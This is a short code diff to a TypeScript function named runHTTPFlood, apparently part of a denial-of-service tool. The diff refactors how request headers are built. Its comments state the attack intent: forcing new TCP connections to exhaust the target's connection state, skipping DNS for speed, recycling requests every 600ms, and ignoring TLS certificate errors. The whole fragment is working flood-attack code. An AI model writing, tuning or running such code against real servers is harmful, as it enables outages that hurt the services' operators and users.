@@ -911,17 +911,20 @@ async function runHTTPFlood(
       catch { return "/" }
     })();
 
+    const reqHeaders: Record<string, string> = {
+      ...headers as Record<string, string>,
+      Host:       hostname,
+      Connection: "close",
+    };
+    if (bodyBuf) reqHeaders["Content-Length"] = String(bodyBuf.length);
+    else delete reqHeaders["Content-Length"];
+
     const reqOpts: http.RequestOptions | https.RequestOptions = {
       hostname:          resolvedIp,          // pre-resolved — skip DNS each time
       port:              tgtPort,
       path:              reqPath,
       method,
-      headers: {
-        ...headers,
-        Host:            hostname,            // correct Host for virtual-hosting
-        Connection:      "close",             // force new TCP — exhausts connection state
-        "Content-Length": bodyBuf ? String(bodyBuf.length) : undefined,
-      } as Record<string, string>,
+      headers:           reqHeaders,
       agent: isHttps ? HTTPS_AGENT : HTTP_AGENT,
       timeout: 600,                           // 600ms — fast recycling
       ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
